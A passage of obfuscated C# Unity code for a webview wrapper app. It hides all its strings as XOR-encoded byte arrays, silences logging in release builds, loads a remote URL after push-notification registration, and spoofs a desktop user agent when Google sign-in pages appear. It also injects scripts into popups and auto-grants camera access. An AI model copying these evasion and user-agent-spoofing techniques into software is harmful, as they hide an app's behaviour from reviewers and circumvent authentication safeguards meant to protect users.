#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[34] { 199, 200, 249, 239, 232, 193, 188, 218, 249, 232, 255, 244, 188, 217, 228, 232, 238, 253, 188, 204, 233, 239, 244, 188, 216, 253, 232, 253, 188, 206, 253, 235, 166, 188 }, 156) + _0xc6b06a39);
#endif
            }
        }

        var _0x110debf9 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xc6b06a39);
        StartCoroutine(_0x653c1e87(_0x110debf9));
    }

    private bool _0x7875f684()
    {
        if (_0x2f6abdfc())
            return true;
        if (_0xf17178f5 != null && _0xf17178f5.CanGoBack)
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[36] { 109, 68, 87, 65, 82, 68, 87, 64, 5, 71, 68, 70, 78, 5, 8, 27, 5, 72, 68, 76, 75, 5, 114, 64, 71, 115, 76, 64, 82, 5, 98, 74, 103, 68, 70, 78 }, 37));
            _0xf17178f5.GoBack();
            return true;
        }

        return false;
    }

    private async Task<bool> _0xc53e979b()
    {
        _0x31ad5810.Instance?._0x866f473e();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0xe6dcd9fb) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[32] { 107, 100, 85, 67, 68, 109, 16, 101, 94, 89, 68, 73, 16, 96, 69, 67, 88, 16, 126, 95, 68, 89, 86, 89, 83, 81, 68, 89, 95, 94, 10, 16 }, 48) + string.Join(_0x96e02e0a._0x40b5567f(new byte[1] { 48 }, 57), _0xe6dcd9fb));
                }
#endif
            }
        };
        try
        {
            _0x4aeac62c = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[31] { 106, 101, 84, 66, 69, 108, 17, 119, 80, 88, 93, 84, 85, 17, 69, 94, 17, 86, 84, 69, 17, 65, 68, 66, 89, 17, 69, 94, 90, 84, 95 }, 49));
                }
#endif
            }

            _0x4aeac62c = "";
        }

        _0x1dbb3f2e = !string.IsNullOrEmpty(_0x4aeac62c);
        _0xe29e5233 = _0x4e5649da();
        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[25] { 162, 173, 156, 138, 141, 164, 217, 172, 151, 144, 141, 128, 217, 169, 140, 138, 145, 217, 173, 150, 146, 156, 151, 195, 217 }, 249) + _0x4aeac62c);
#endif
        }

        _0x31ad5810.Instance?._0xc87bda49();
        return false;
    }

    private bool _0xd409c180 = false;
    private async Task<bool> _0x8044514f()
    {
        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[29] { 85, 90, 107, 125, 122, 83, 46, 71, 125, 94, 124, 103, 120, 111, 109, 119, 79, 96, 106, 93, 111, 120, 107, 106, 77, 102, 107, 109, 101 }, 14));
#endif
        }

        string _0xc1537e9c = "";
        for (int _0xc3034d8f = 0; _0xc3034d8f < 2; _0xc3034d8f++)
        {
            if (await _0xa7412165(1, 100))
            {
                await _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[7] { 56, 54, 53, 57, 49, 63, 62 }, 90));
                _0x52176c73();
                return true;
            }

            _0xc1537e9c = await _0x58ec633f(1, 100);
            if (!string.IsNullOrEmpty(_0xc1537e9c))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0xc1537e9c))
            {
                if (!string.IsNullOrEmpty(_0x9d112333))
                {
                    _0xc1537e9c = _0x5c567bda(_0xc1537e9c, _0x9d112333);
                    {
#if B_LOGS
                        Debug.Log(_0x96e02e0a._0x40b5567f(new byte[53] { 198, 201, 248, 238, 233, 192, 189, 222, 252, 254, 245, 248, 249, 189, 251, 244, 243, 252, 241, 200, 239, 241, 189, 234, 244, 233, 245, 189, 238, 248, 243, 249, 244, 249, 189, 127, 27, 15, 189, 238, 245, 242, 234, 189, 202, 248, 255, 203, 244, 248, 234, 167, 189 }, 157) + _0xc1537e9c);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x96e02e0a._0x40b5567f(new byte[39] { 176, 191, 142, 152, 159, 182, 203, 168, 138, 136, 131, 142, 143, 203, 141, 130, 133, 138, 135, 190, 153, 135, 203, 9, 109, 121, 203, 152, 131, 132, 156, 203, 188, 142, 137, 189, 130, 142, 156 }, 235));
#endif
                    }
                }

                _0x68fb8605 = true;
                _0x0643685d(_0xc1537e9c);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[44] { 127, 112, 65, 87, 80, 121, 4, 97, 92, 71, 65, 84, 80, 77, 75, 74, 4, 83, 76, 77, 72, 65, 4, 71, 76, 65, 71, 79, 77, 74, 67, 4, 87, 69, 82, 65, 64, 4, 72, 77, 74, 79, 30, 4 }, 36) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0x5c567bda(string _0x3e212804, string _0x91faf489)
    {
        if (string.IsNullOrEmpty(_0x91faf489))
            return _0x3e212804;
        if (_0x3e212804.Contains(_0x96e02e0a._0x40b5567f(new byte[1] { 64 }, 127)))
            return _0x3e212804 + _0x96e02e0a._0x40b5567f(new byte[8] { 120, 45, 59, 48, 58, 55, 58, 99 }, 94) + UnityWebRequest.EscapeURL(_0x91faf489);
        else
            return _0x3e212804 + _0x96e02e0a._0x40b5567f(new byte[8] { 202, 134, 144, 155, 145, 156, 145, 200 }, 245) + UnityWebRequest.EscapeURL(_0x91faf489);
    }

    private string _0x6918beb9 = "";
    private void _0xff491514(UniWebView _0x12178dda)
    {
        if (_0x793ea5be)
            return;
        _0x793ea5be = true;
        _0x12178dda.AddUrlScheme(_0x96e02e0a._0x40b5567f(new byte[2] { 219, 200 }, 175));
        _0x12178dda.AddUrlScheme(_0x96e02e0a._0x40b5567f(new byte[6] { 181, 178, 168, 185, 178, 168 }, 220));
        _0x12178dda.AddUrlScheme(_0x96e02e0a._0x40b5567f(new byte[6] { 195, 207, 220, 197, 203, 218 }, 174));
        _0x12178dda.OnMessageReceived += (_0xe56768ed, _0x98bc61f8) =>
        {
            if (TryOpenExternalLikeChrome(_0x98bc61f8.RawMessage))
            {
                _0x016e8f07(false);
                return;
            }
        };
        _0x12178dda.RegisterShouldHandleRequest(_0xbde633d6 =>
        {
            string _0x721a4d6d = _0xbde633d6 != null ? _0xbde633d6.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x721a4d6d))
                return true;
            WLog(_0x96e02e0a._0x40b5567f(new byte[21] { 254, 197, 194, 216, 193, 201, 229, 204, 195, 201, 193, 200, 255, 200, 220, 216, 200, 222, 217, 151, 141 }, 173) + _0x721a4d6d);
            if (TryOpenExternalLikeChrome(_0x721a4d6d))
            {
                _0x016e8f07(false);
                return false;
            }

            if (_0xbde633d6 != null && _0xbde633d6.IsMainFrame && IsGoogleAuthFlowUrl(_0x721a4d6d) && !_0x1028a85a)
            {
                WLog(_0x96e02e0a._0x40b5567f(new byte[62] { 119, 91, 83, 84, 26, 109, 95, 88, 108, 83, 95, 77, 26, 94, 95, 78, 95, 89, 78, 95, 94, 26, 125, 85, 85, 93, 86, 95, 26, 91, 79, 78, 82, 26, 111, 104, 118, 26, 23, 4, 26, 72, 95, 86, 85, 91, 94, 26, 77, 83, 78, 82, 26, 125, 85, 85, 93, 86, 95, 26, 111, 123 }, 58));
                _0x1028a85a = true;
                _0x016e8f07(true);
                _0xf17178f5.SetUserAgent(_0xa0d30070());
                _0xf17178f5.Load(_0x721a4d6d);
                return false;
            }

            return true;
        });
        _0x12178dda.OnLoadingErrorReceived += (_0xe56768ed, _0x3be44581, _0x98bc61f8, _0xbfa23d79) =>
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[25] { 60, 16, 24, 31, 81, 38, 20, 19, 39, 24, 20, 6, 81, 52, 3, 3, 30, 3, 75, 81, 18, 30, 21, 20, 76 }, 113) + _0x3be44581 + _0x96e02e0a._0x40b5567f(new byte[9] { 36, 105, 97, 119, 119, 101, 99, 97, 57 }, 4) + _0x98bc61f8);
            string _0xe363b103 = GetFailingUrl(_0xbfa23d79);
            if (string.IsNullOrEmpty(_0xe363b103) || IsAboutBlank(_0xe363b103))
                return;
            _ = _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[8] { 224, 225, 200, 242, 229, 229, 248, 229 }, 151));
            WLog(_0x96e02e0a._0x40b5567f(new byte[45] { 87, 123, 115, 116, 58, 77, 127, 120, 76, 115, 127, 109, 58, 124, 123, 115, 118, 115, 116, 125, 58, 79, 72, 86, 58, 55, 36, 58, 117, 106, 127, 116, 58, 127, 98, 110, 127, 104, 116, 123, 118, 118, 99, 32, 58 }, 26) + _0xe363b103);
            StopCurrentFailedLoad(_0xe56768ed);
            _0x7f4a9802(_0xe363b103);
        };
        _0x12178dda.OnPageStarted += (_0xe56768ed, _0x099e0e44) =>
        {
            _0xed1a24d2 = 0;
            if (_0x303ec762 && IsAboutBlank(_0x099e0e44))
            {
                WLog(_0x96e02e0a._0x40b5567f(new byte[27] { 58, 24, 15, 29, 11, 24, 7, 74, 11, 8, 5, 31, 30, 80, 8, 6, 11, 4, 1, 74, 25, 30, 11, 24, 30, 15, 14 }, 106));
                return;
            }

            WLog(_0x96e02e0a._0x40b5567f(new byte[29] { 51, 31, 23, 16, 94, 41, 27, 28, 40, 23, 27, 9, 94, 49, 16, 46, 31, 25, 27, 45, 10, 31, 12, 10, 27, 26, 68, 94, 85 }, 126) + (Time.realtimeSinceStartup - _0xf42cf416).ToString(_0x96e02e0a._0x40b5567f(new byte[5] { 115, 109, 115, 115, 115 }, 67)) + _0x96e02e0a._0x40b5567f(new byte[2] { 207, 156 }, 188) + _0x099e0e44);
            if (TryOpenExternalLikeChrome(_0x099e0e44))
            {
                StopCurrentFailedLoad(_0xe56768ed);
                return;
            }

            if (ContainsIgnoreCase(_0x099e0e44, _0x96e02e0a._0x40b5567f(new byte[8] { 77, 64, 64, 72, 7, 72, 89, 89 }, 41)) || ContainsIgnoreCase(_0x099e0e44, _0x96e02e0a._0x40b5567f(new byte[15] { 210, 195, 219, 140, 213, 203, 198, 197, 199, 214, 140, 192, 206, 205, 197 }, 162)) || _0x099e0e44.StartsWith(_0x96e02e0a._0x40b5567f(new byte[25] { 18, 14, 14, 10, 9, 64, 85, 85, 24, 10, 29, 22, 21, 24, 27, 22, 28, 27, 12, 84, 22, 19, 12, 31, 85 }, 122), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xe56768ed);
                OpenUrlExternally(_0x099e0e44);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x099e0e44))
            {
                _0x016e8f07(true);
                WLog(_0x96e02e0a._0x40b5567f(new byte[41] { 109, 69, 69, 77, 70, 79, 10, 75, 95, 94, 66, 10, 76, 70, 69, 93, 10, 78, 79, 94, 79, 73, 94, 79, 78, 10, 7, 20, 10, 65, 79, 79, 90, 10, 92, 67, 89, 67, 72, 70, 79 }, 42));
                return;
            }

            _0x1d451dcf = true;
            _0x016e8f07(true);
            WLog(_0x96e02e0a._0x40b5567f(new byte[43] { 97, 83, 84, 96, 95, 83, 65, 22, 90, 89, 87, 82, 95, 88, 81, 25, 68, 83, 82, 95, 68, 83, 85, 66, 95, 88, 81, 22, 27, 8, 22, 93, 83, 83, 70, 22, 64, 95, 69, 95, 84, 90, 83 }, 54));
        };
        _0x12178dda.OnPageCommitted += (_0xe56768ed, _0x099e0e44) =>
        {
            if (_0x303ec762 && IsAboutBlank(_0x099e0e44))
                return;
            WLog(_0x96e02e0a._0x40b5567f(new byte[31] { 6, 42, 34, 37, 107, 28, 46, 41, 29, 34, 46, 60, 107, 4, 37, 27, 42, 44, 46, 8, 36, 38, 38, 34, 63, 63, 46, 47, 113, 107, 96 }, 75) + (Time.realtimeSinceStartup - _0xf42cf416).ToString(_0x96e02e0a._0x40b5567f(new byte[5] { 222, 192, 222, 222, 222 }, 238)) + _0x96e02e0a._0x40b5567f(new byte[2] { 198, 149 }, 181) + _0x099e0e44);
            if (!firstLoadShown && IsHttpUrl(_0x099e0e44))
            {
                firstLoadShown = true;
                _0x1d451dcf = false;
                _0x016e8f07(false);
                _0x1b8183ac();
                _0x7273e4d1();
                _0xe56768ed.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[9] { 32, 33, 8, 56, 39, 50, 57, 50, 51 }, 87));
                WLog(_0x96e02e0a._0x40b5567f(new byte[39] { 27, 55, 63, 56, 118, 1, 51, 52, 0, 63, 51, 33, 118, 37, 62, 57, 33, 56, 118, 57, 56, 118, 53, 57, 59, 59, 63, 34, 34, 51, 50, 118, 53, 57, 56, 34, 51, 56, 34 }, 86));
            }
        };
        _0x12178dda.OnPageProgressChanged += (_0xe56768ed, _0xc734d4df) =>
        {
            if (_0x303ec762)
                return;
            if (!firstLoadShown && _0xc734d4df >= 0.65f)
            {
                firstLoadShown = true;
                _0x1d451dcf = false;
                _0x016e8f07(false);
                _0x1b8183ac();
                _0x7273e4d1();
                _0xe56768ed.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[9] { 207, 206, 231, 215, 200, 221, 214, 221, 220 }, 184));
                WLog(_0x96e02e0a._0x40b5567f(new byte[32] { 191, 147, 155, 156, 210, 165, 151, 144, 164, 155, 151, 133, 210, 129, 154, 157, 133, 156, 210, 144, 139, 210, 130, 128, 157, 149, 128, 151, 129, 129, 200, 210 }, 242) + _0xc734d4df);
            }
        };
        _0x12178dda.OnPageFinished += (_0xe56768ed, _0x3be44581, _0x099e0e44) =>
        {
            if (_0x303ec762 && IsAboutBlank(_0x099e0e44))
            {
                _0x303ec762 = false;
                WLog(_0x96e02e0a._0x40b5567f(new byte[28] { 153, 187, 172, 190, 168, 187, 164, 233, 168, 171, 166, 188, 189, 243, 171, 165, 168, 167, 162, 233, 175, 160, 167, 160, 186, 161, 172, 173 }, 201));
                return;
            }

            WLog(_0x96e02e0a._0x40b5567f(new byte[24] { 243, 223, 215, 208, 158, 233, 219, 220, 232, 215, 219, 201, 158, 248, 215, 208, 215, 205, 214, 219, 218, 132, 158, 149 }, 190) + (Time.realtimeSinceStartup - _0xf42cf416).ToString(_0x96e02e0a._0x40b5567f(new byte[5] { 113, 111, 113, 113, 113 }, 65)) + _0x96e02e0a._0x40b5567f(new byte[7] { 10, 89, 26, 22, 29, 28, 68 }, 121) + _0x3be44581 + _0x96e02e0a._0x40b5567f(new byte[5] { 9, 92, 91, 69, 20 }, 41) + _0x099e0e44);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x1d451dcf = false;
                _0x016e8f07(false);
                _0x1b8183ac();
                _0x7273e4d1();
                _0xe56768ed.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[9] { 201, 200, 225, 209, 206, 219, 208, 219, 218 }, 190));
                WLog(_0x96e02e0a._0x40b5567f(new byte[33] { 247, 219, 211, 212, 154, 237, 223, 216, 236, 211, 223, 205, 154, 220, 211, 200, 201, 206, 154, 214, 213, 219, 222, 154, 217, 213, 215, 202, 214, 223, 206, 223, 222 }, 186));
            }
            else if (_0x1d451dcf)
            {
                _0x1d451dcf = false;
                _0x016e8f07(false);
                _0xe56768ed.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x96e02e0a._0x40b5567f(new byte[40] { 12, 32, 40, 47, 97, 22, 36, 35, 23, 40, 36, 54, 97, 18, 41, 46, 54, 97, 32, 39, 53, 36, 51, 97, 45, 46, 32, 37, 40, 47, 38, 97, 39, 40, 47, 40, 50, 41, 36, 37 }, 65));
            }
            else
            {
                _0x016e8f07(false);
            }

            if (_0x1028a85a && !IsGoogleAuthFlowUrl(_0x099e0e44) && !IsGoogleAuthFlowUrl(_0x099e0e44))
            {
                WLog(_0x96e02e0a._0x40b5567f(new byte[48] { 76, 100, 100, 108, 103, 110, 43, 106, 126, 127, 99, 43, 120, 110, 110, 102, 120, 43, 109, 98, 101, 98, 120, 99, 110, 111, 43, 38, 53, 43, 121, 110, 120, 127, 100, 121, 110, 43, 111, 110, 109, 106, 126, 103, 127, 43, 94, 74 }, 11));
                _0x1028a85a = false;
                _0xf17178f5.SetUserAgent("");
            }
        };
        _0x12178dda.OnShouldClose += _0xe56768ed =>
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[41] { 234, 229, 212, 194, 197, 236, 145, 252, 208, 216, 223, 145, 230, 212, 211, 231, 216, 212, 198, 145, 254, 223, 226, 217, 222, 196, 221, 213, 242, 221, 222, 194, 212, 145, 216, 223, 199, 222, 218, 212, 213 }, 177));
            _0x4cbbba01();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x12178dda.SetPopupPageEventEnabled(true);
        bool _0x065e36c2 = false;
        bool _0x527a1ceb = false;
        _0x12178dda.OnMultipleWindowOpened += (_0xe56768ed, _0x53e464a7) =>
        {
            _0xe56768ed.ScrollTo(0, 0, false);
            WLog(_0x96e02e0a._0x40b5567f(new byte[43] { 8, 7, 54, 32, 39, 14, 115, 30, 50, 58, 61, 115, 4, 54, 49, 5, 58, 54, 36, 115, 30, 38, 63, 39, 58, 35, 63, 54, 4, 58, 61, 55, 60, 36, 115, 28, 35, 54, 61, 54, 55, 105, 115 }, 83) + _0x53e464a7);
            var _0x50f65c52 = _0x12178dda.GetPopupWindow(_0x53e464a7);
            if (_0x50f65c52 == null)
                return;
            _0x81ab6676.Add(_0x50f65c52);
            Debug.Log($"[Test] Popup ID: {_0x50f65c52.Id}");
            _0x50f65c52.OnPageStarted += (_0xf1ed5ea4, _0x099e0e44) =>
            {
                WLog(_0x96e02e0a._0x40b5567f(new byte[36] { 81, 94, 111, 121, 126, 87, 42, 90, 101, 122, 127, 122, 42, 93, 111, 104, 92, 99, 111, 125, 42, 69, 100, 90, 107, 109, 111, 89, 126, 107, 120, 126, 111, 110, 48, 42 }, 10) + _0x099e0e44);
                _0xed1a24d2 = 0;
                if (string.IsNullOrEmpty(_0x099e0e44) || IsAboutBlank(_0x099e0e44))
                    return;
                if (IsGoogleAuthFlowUrl(_0x099e0e44))
                {
                    WLog(_0x96e02e0a._0x40b5567f(new byte[57] { 133, 138, 187, 173, 170, 131, 254, 142, 177, 174, 171, 174, 254, 153, 177, 177, 185, 178, 187, 254, 191, 171, 170, 182, 254, 184, 178, 177, 169, 254, 243, 224, 254, 173, 174, 177, 177, 184, 254, 153, 177, 177, 185, 178, 187, 254, 157, 182, 172, 177, 179, 187, 254, 139, 159, 228, 254 }, 222) + _0x099e0e44);
                    _0x065e36c2 = false;
                    _0x28e1108f();
                    if (_0xf1ed5ea4 != null && _0xf1ed5ea4.IsAlive)
                        _0xf1ed5ea4.EvaluateJavaScript(_0x30e61770());
                    return;
                }

                if (_0xf17178f5 == null)
                    return;
                if (!_0x065e36c2)
                {
                    _0x065e36c2 = true;
                    _0xf17178f5.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x96e02e0a._0x40b5567f(new byte[39] { 172, 163, 146, 132, 131, 170, 215, 167, 152, 135, 130, 135, 215, 150, 135, 135, 155, 142, 215, 160, 158, 153, 147, 152, 128, 132, 215, 147, 146, 132, 156, 131, 152, 135, 215, 162, 182, 205, 215 }, 247) + _0x099e0e44);
                }

                if (_0xf1ed5ea4 != null && _0xf1ed5ea4.IsAlive)
                    _0xf1ed5ea4.EvaluateJavaScript(_0x37c0f024());
                if (!_0x527a1ceb && _0xf1ed5ea4 != null && _0xf1ed5ea4.IsAlive && IsHttpUrl(_0x099e0e44))
                {
                    _0x527a1ceb = true;
                }
            };
            _0x50f65c52.OnPageFinished += (_0xf1ed5ea4, _0xbfa23d79) =>
            {
                string _0x602803ca = _0xbfa23d79 != null ? _0xbfa23d79.data : string.Empty;
                WLog(_0x96e02e0a._0x40b5567f(new byte[35] { 128, 143, 190, 168, 175, 134, 251, 139, 180, 171, 174, 171, 251, 140, 190, 185, 141, 178, 190, 172, 251, 157, 178, 181, 178, 168, 179, 190, 191, 225, 251, 174, 169, 183, 230 }, 219) + _0x602803ca);
                if (_0xf1ed5ea4 == null || !_0xf1ed5ea4.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x602803ca))
                {
                    _0x28e1108f();
                    _0xf1ed5ea4.EvaluateJavaScript(_0x30e61770());
                    return;
                }

                if (!_0x065e36c2)
                    return;
                _0xf1ed5ea4.EvaluateJavaScript(_0x37c0f024());
            };
        };
        _0x12178dda.OnMultipleWindowClosed += (_0xe56768ed, _0x53e464a7) =>
        {
            _0x81ab6676.RemoveAll(_0x432fc95e => _0x432fc95e == null || _0x432fc95e.Id == _0x53e464a7 || !_0x432fc95e.IsAlive);
            _0x016e8f07(false);
            if (_0x81ab6676.Count == 0 && _0xf17178f5 != null)
            {
                _0x065e36c2 = false;
                _0x527a1ceb = false;
                _0x420be22f();
            }

            WLog(_0x96e02e0a._0x40b5567f(new byte[43] { 175, 160, 145, 135, 128, 169, 212, 185, 149, 157, 154, 212, 163, 145, 150, 162, 157, 145, 131, 212, 185, 129, 152, 128, 157, 132, 152, 145, 163, 157, 154, 144, 155, 131, 212, 183, 152, 155, 135, 145, 144, 206, 212 }, 244) + _0x53e464a7);
        };
        _0x12178dda.RegisterOnRequestMediaCapturePermission(_0xbde633d6 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string _0x34edc091 = "";
    private readonly string[] _0xf6e2b439 = new string[]
    {
        _0x96e02e0a._0x40b5567f(new byte[60] { 246, 153, 136, 182, 38, 82, 110, 99, 38, 116, 99, 99, 106, 117, 38, 103, 116, 99, 38, 110, 105, 114, 38, 116, 111, 97, 110, 114, 38, 104, 105, 113, 38, 228, 134, 149, 38, 98, 105, 104, 228, 134, 159, 114, 38, 107, 111, 117, 117, 38, 127, 105, 115, 116, 38, 117, 118, 111, 104, 39 }, 6),
        _0x96e02e0a._0x40b5567f(new byte[52] { 252, 147, 129, 140, 44, 69, 120, 44, 111, 99, 121, 96, 104, 44, 110, 105, 44, 117, 99, 121, 126, 44, 96, 121, 111, 103, 117, 44, 97, 99, 97, 105, 98, 120, 44, 238, 140, 159, 44, 123, 100, 117, 44, 127, 120, 99, 124, 44, 98, 99, 123, 51 }, 12),
        _0x96e02e0a._0x40b5567f(new byte[66] { 39, 95, 100, 42, 125, 74, 229, 135, 172, 162, 229, 178, 172, 171, 182, 229, 164, 183, 160, 229, 173, 172, 177, 177, 172, 171, 162, 229, 168, 170, 183, 160, 229, 170, 163, 177, 160, 171, 229, 177, 170, 161, 164, 188, 229, 39, 69, 86, 229, 182, 177, 164, 188, 229, 172, 171, 229, 177, 173, 160, 229, 162, 164, 168, 160, 235 }, 197),
        _0x96e02e0a._0x40b5567f(new byte[54] { 73, 38, 44, 43, 153, 237, 209, 208, 202, 153, 208, 202, 153, 201, 203, 208, 212, 220, 153, 205, 208, 212, 220, 153, 91, 57, 42, 153, 205, 209, 220, 153, 219, 220, 202, 205, 153, 201, 213, 216, 192, 220, 203, 202, 153, 201, 213, 216, 192, 153, 215, 214, 206, 151 }, 185),
        _0x96e02e0a._0x40b5567f(new byte[48] { 28, 115, 120, 73, 204, 181, 131, 153, 158, 204, 155, 133, 130, 130, 133, 130, 139, 204, 159, 152, 158, 137, 141, 135, 204, 143, 131, 153, 128, 136, 204, 142, 137, 204, 131, 130, 137, 204, 159, 156, 133, 130, 204, 141, 155, 141, 149, 194 }, 236),
        _0x96e02e0a._0x40b5567f(new byte[65] { 206, 161, 164, 190, 30, 116, 95, 93, 85, 78, 81, 74, 77, 30, 95, 76, 91, 30, 83, 81, 76, 91, 30, 95, 93, 74, 87, 72, 91, 30, 74, 81, 80, 87, 89, 86, 74, 30, 220, 190, 173, 30, 77, 74, 95, 71, 30, 95, 80, 90, 30, 74, 76, 71, 30, 71, 81, 75, 76, 30, 82, 75, 93, 85, 16 }, 62),
        _0x96e02e0a._0x40b5567f(new byte[55] { 19, 124, 109, 81, 195, 166, 149, 134, 145, 154, 195, 144, 147, 138, 141, 195, 128, 140, 150, 141, 151, 144, 195, 1, 99, 112, 195, 151, 139, 134, 195, 141, 134, 155, 151, 195, 140, 141, 134, 195, 128, 140, 150, 143, 135, 195, 129, 134, 195, 154, 140, 150, 145, 144, 205 }, 227),
        _0x96e02e0a._0x40b5567f(new byte[63] { 84, 27, 38, 89, 14, 57, 150, 230, 218, 215, 207, 211, 196, 197, 150, 196, 223, 209, 222, 194, 150, 216, 217, 193, 150, 215, 196, 211, 150, 193, 223, 216, 216, 223, 216, 209, 150, 84, 54, 37, 150, 210, 217, 216, 84, 54, 47, 194, 150, 193, 215, 218, 221, 150, 215, 193, 215, 207, 150, 207, 211, 194, 152 }, 182),
        _0x96e02e0a._0x40b5567f(new byte[51] { 212, 187, 171, 162, 4, 107, 74, 72, 93, 4, 80, 76, 75, 87, 65, 4, 83, 76, 75, 4, 87, 80, 69, 93, 4, 77, 74, 4, 80, 76, 65, 4, 67, 69, 73, 65, 4, 83, 77, 74, 4, 80, 76, 65, 4, 84, 86, 77, 94, 65, 10 }, 36),
        _0x96e02e0a._0x40b5567f(new byte[64] { 35, 91, 96, 46, 121, 78, 225, 140, 174, 172, 164, 175, 181, 180, 172, 225, 168, 178, 225, 164, 183, 164, 179, 184, 181, 169, 168, 175, 166, 225, 35, 65, 82, 225, 170, 164, 164, 177, 225, 178, 177, 168, 175, 175, 168, 175, 166, 225, 167, 174, 179, 225, 184, 174, 180, 179, 225, 162, 169, 160, 175, 162, 164, 239 }, 193)
    };
    private string _0xdee17bb5 = "";
    internal bool ContainsIgnoreCase(string _0xf9611bb1, string _0x6593a00d)
    {
        if (string.IsNullOrEmpty(_0xf9611bb1) || string.IsNullOrEmpty(_0x6593a00d))
            return false;
        return _0xf9611bb1.IndexOf(_0x6593a00d, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0x41951336)
    {
        if (_0x41951336 == null || _0x41951336.Extra == null)
            return null;
        object _0x582e0063;
        if (!_0x41951336.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x582e0063))
            return null;
        return _0x582e0063 as string;
    }

    private void Awake()
    {
        if (_0x979cb192 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x979cb192 = gameObject.GetComponent<_0x08e537a8>();
        DontDestroyOnLoad(gameObject);
        _0x4aeac62c = _0xe84d82d3 = _0xe7b0fa00 = "";
        _0xf16dcc98 = "";
        _0x6ab25542 = false;
    }

    // WS_SOURCE MONO
    public static _0x08e537a8 _0x979cb192 { get; private set; }

    internal bool firstLoadShown = false;
    private string _0x9509e8d2()
    {
        try
        {
            using (var _0xac819303 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 143, 131, 129, 194, 153, 130, 133, 152, 149, 223, 136, 194, 156, 128, 141, 149, 137, 158, 194, 185, 130, 133, 152, 149, 188, 128, 141, 149, 137, 158 }, 236)))
            {
                var _0xdb78a124 = _0xac819303.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 87, 65, 70, 70, 81, 90, 64, 117, 87, 64, 93, 66, 93, 64, 77 }, 52));
                var _0xe6b2f76b = _0xdb78a124.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[21] { 9, 11, 26, 47, 30, 30, 2, 7, 13, 15, 26, 7, 1, 0, 45, 1, 0, 26, 11, 22, 26 }, 110));
                using (var _0xd43ddf6e = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[26] { 33, 46, 36, 50, 47, 41, 36, 110, 55, 37, 34, 43, 41, 52, 110, 23, 37, 34, 19, 37, 52, 52, 41, 46, 39, 51 }, 64)))
                {
                    return _0xd43ddf6e.CallStatic<string>(_0x96e02e0a._0x40b5567f(new byte[19] { 62, 60, 45, 29, 60, 63, 56, 44, 53, 45, 12, 42, 60, 43, 24, 62, 60, 55, 45 }, 89), _0xe6b2f76b);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private bool _0x812747df(int _0x38ab8cb5, string _0xa1c76e32, string _0x0f9bd217)
    {
        if (string.IsNullOrEmpty(_0x0f9bd217))
            return false;
        if (!IsHttpUrl(_0x0f9bd217))
            return true;
        if (string.IsNullOrEmpty(_0xa1c76e32))
            return false;
